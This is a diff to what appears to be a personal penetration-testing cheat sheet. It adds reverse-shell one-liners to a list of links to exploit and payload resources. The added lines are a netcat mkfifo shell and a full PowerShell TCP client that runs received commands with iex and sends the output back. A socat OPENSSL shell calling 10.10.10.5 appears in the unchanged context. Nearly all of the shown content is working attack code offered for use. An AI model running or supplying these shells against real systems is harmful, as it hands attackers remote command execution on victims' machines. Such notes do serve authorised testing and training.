@@ -8,6 +8,7 @@ https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/
 https://www.exploit-db.com/                                                       # exploit DB
 https://www.revshells.com/                                                        # shells generator
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md  # shell cheat sheet
+
 https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys  # interactive bash fully TTY
 https://gtfobins.github.io/                                                       # bypass local security restrictions in Linux
 https://github.com/payloadbox/command-injection-payload-list                      # Cheatsheet for command injection
@@ -272,6 +273,11 @@ socat OPENSSL:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 
 ####################################################################################
 mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
 
 ####################### create reversshells util ##################################
 
